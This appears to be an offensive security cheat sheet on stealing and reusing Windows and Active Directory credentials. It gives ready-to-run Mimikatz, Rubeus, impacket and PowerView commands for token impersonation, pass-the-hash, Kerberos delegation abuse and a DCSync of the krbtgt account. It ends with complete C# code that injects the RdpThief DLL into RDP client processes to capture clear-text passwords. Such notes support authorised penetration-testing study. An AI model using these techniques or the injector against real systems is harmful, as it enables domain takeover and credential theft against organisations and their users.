# Getting & Using Credentials

### Token Impersonation

#### Covenant

```text
ImpersonateUser <user>
ImpersonateProcess <pid>
RevToSelf
```

#### Metasploit

```text
load incognito
list_tokens -u
impersonate_token <user>
rev2self
```

#### Resources

* [Sandbox-analysis-tools](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/releases)
* [Roguepotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/amp/?__twitter_impression=true)
* [TokenKidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)

### Creating Tokens

#### Covenant

```text
MakeToken <user> <domain> <password>
```

#### Overpass-the-Hash

Create ticket for user:

```text
Rubeus triage
Rubeus asktgt /user:<user> /rc4:<user ntlm hash>
```

Get the base64 ticket from Rubeus output and clean it up. You can only have one TGT per logon session so the correct way is to create \*sacrificial\* logon session and apply the ticket there:

```text
MakeToken <user> <domain> <anything>
Rubeus triage
Rubeus ptt /ticket:<ticket>
Rubeus triage
RevToSelf
```

The same can be done with impacket:

```text
getTGT.py <domain>/<user> -hashes :<hash>
getTGT.py <domain>/<user> -aesKey:<key>
getTGT.py <domain>/<user>:'password'
```

### Process Injection

There is a custom [Covenant task](https://github.com/ZeroPointSecurity/RTOVMSetup/tree/master/Covenant) that allows to inject shellcode into a process. By  typing `Inject` a popup will appear where you paste the shellcode.

[Donut ](https://github.com/TheWover/donut)can be used to generate shellcode from .NET assemblies.

### Pass-The-Hash

#### Mimikatz

```text
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm hash> /run:powershell
```

When running `mstsc.exe /restrictedadmin` this could give us RDP access to other boxes without knowing the clear text cred \(but passing the hash with xfreerdp works too\).

### Netonly

A logon session can only accommodate one TGT at a time, therefore its sometimes required to create another session before applying a TGT to it.

```text
Rubeus triage
Rubeus createnetonly /program:c:\windows\system32\cmd.exe
Rubeus triage
Rubeus ptt /luid:<luid> /ticket:<ticket>
```

After applying the ticket to the process we can impersonate it e.g. in Covenant `Impersonate Process <pid>`.

### Unconstrained Delegation

Unrestricted access to services on behalf of a user. Find with:

```text
Get-DomainComputer -Unconstrained -Properties DnsHostName
```

List & dump ticket:

```text
Rubeus triage
Rubeus dump /luid:<>
```

Since we can only have 1 ticket per logon session spawn a new process first and note luid:

```text
Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
...
[+] ProcessID       : 3256
[+] LUID            : 0x584fe68
```

Then apply the ticket:

```text
Rubeus ptt /luid:0x584fe68 /ticket:<>
```

Finally impersonate the process with  `ImpersonateProcess 3256` . Note that this will not change the output of whoami.

We can also use mimikatz:

```text
privilege::debug
sekurlsa::tickets /export
kerberos::ptt ticket.kirbi
exit
```

Ticket is now applied and we can connect to the target \(e.g. PsExec\).

#### PrinterBug with Unconstrained Delegation

Monitor tickets with Rubeus:

```text
Rubeus monitor /interval:5 /filteruser:dc$
```

Run [SpoolSample](https://github.com/leechristensen/SpoolSample):

```text
SpoolSample.exe dc$ <server with unconstrained delegation we have a shell on>
```

After getting the TGT with Rubeus we can ptt and DCSync:

```text
Rubeus ptt /ticket:...
mimikatz # lsadump::dcsync /domain:... /user:<domain>\krbtgt
```

This can even be used across domains in a forest environment!

### Constrained Delegation

Restricts the services you can access on behalf of a user to a subset. Find machines that have it:

```text
PowerShell Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
```

You always want to check Bloodhound too - often the delegation is only for a single service type like "time", so we have to take that into account when generating tickets with Rubeus s4u.

Dump ticket:

```text
Rubeus dump /service:krbtgt
```

Generate ticket:

```text
Rubeus s4u /impersonateuser:<user> /msdsspn:cifs/<server>.<domain> /ticket:<ticket>
```

We can then apply it like on unconstrained delegation.

It might not always be the case that we find delegation for a useful service, in this case its possible to swap out the original service with more useful ones:

```text
Rubeus.exe s4u /user:<machine$> /rc4:<hash> /impersonateuser:administrator /msdsspn:time/srv.domain.local /altservice:cifs,host,rpcss,http /ptt
```

#### Service types:

* cifs - filesystem access
* http - winrm

In case we have a cleartext password, but not the rc4 hash we can use Rubeus to generate it and create a TGT:

```text
Rubeushash /password:secret
Rubeus asktgt /user:<user> /domain:<domain> /rc4:<hash>
```

### Resource-Based Constrained Delegation

Even if this does not show in BloodHound, if we have AllExentedRights over a machine, we can execute the command. Adding a new domain computer is not always needed \(in case we already have control over one, e.g. used mimikatz to obtain a machine account hash\)

We can use [PowerMad ](https://github.com/Kevin-Robertson/Powermad)to add a new domain computer:

```text
New-MachineAccount -MachineAccount <new-computername> -Password $(ConvertTo-SecureString 'secret' -AsPlainText -Force)
Get-DomainComputer -Identity <new-computername>
```

Set "msds-allowedtoactonbehalfofotheridentity" on a computer we have GenericWrite for so it allows our newly generated computerobject.

```text
$sid = Get-DomainComputer -Identity <new-computername> -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
Get-DomainComputer -Identity <victim-computername>| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'= $SDBytes}
```

Create ticket:

```text
.\Rubeus.exe s4u /user:<new-computername> /rc4:... /impersonateuser:administrator /msdsspn:CIFS/<victim-computername> /ptt
```

### Net Use

```bash
runas /user:administrator /savecred "cmd.exe /k whoami"
net use z: \\<ip>\c$ /user:<username> <password>
```

### Steal RPD Creds

[RDPThief ](https://github.com/0x09AL/RdpThief)allows to get clear text credentials from newly established RDP connections \(via hooking\). It comes in form of a DLL and needs to be injected into  the mscrt.exe process:

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace RDPThief
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            String dllName = "RdpThief.dll";
            while (true) { 
                Process[] mstscProc = Process.GetProcessesByName("mstsc");
                if (mstscProc.Length > 0) {
                    for (int i = 0; i < mstscProc.Length; i++) {
                        int pid = mstscProc[i].Id;
                        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
                        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                        IntPtr outSize;
                        Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
                        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
                    }
                }
            Thread.Sleep(1000);
            }
        }
    }
}

```

